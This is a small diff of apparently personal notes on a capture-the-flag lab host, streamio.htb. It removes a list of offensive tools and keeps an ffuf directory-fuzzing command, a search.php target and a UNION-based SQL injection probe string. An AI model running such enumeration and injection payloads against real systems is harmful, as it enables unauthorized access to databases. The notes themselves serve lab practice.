@@ -1,11 +1,5 @@
 ```
-[SQL Injection
-ffuf with authentication
-evil-winrm
-winPEAS
-BloodHound
-PowerView.ps1
-](https://watch.streamio.htb/
+(https://watch.streamio.htb/
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -fc 403 -e .aspx,.php,.txt,.html
 https://watch.streamio.htb/search.php
 10' union select 1,2,3,4,5,6 -- -
